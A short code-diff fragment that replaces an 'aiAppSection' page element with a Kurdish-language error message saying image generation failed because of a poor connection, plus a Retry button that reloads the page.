+                document.getElementById('aiAppSection').innerHTML = `
+                    <div style="font-size: 50px; margin-bottom: 15px; filter: drop-shadow(0 0 10px #f87171);">⚠️</div>
+                    <h1 style="color: #f87171; font-size: 20px;">وێنەکانت نەتوانران بە تەواوی دروست بکرێن!</h1>
+                    <p style="font-size: 13px; color: #606770; margin-top: 10px;">بەهۆی خراپی دۆخی ئینتەرنێتەکەت و پچڕانی هێڵەکەوە، پرۆسەی دروستکردنی وێنەکان سەرکەوتوو نەبوو. تکایە هێڵی ئینتەرنێتەکەت بپشکنە و دووبارە هەوڵ بدەرەوە.</p>
+                    <button class="btn-primary" onclick="location.reload()" style="margin-top: 15px; background: #f43f5e;">🔄 دووبارە هەوڵدانەوە (Retry)</button>
                 `;
             }, 1000);
         }
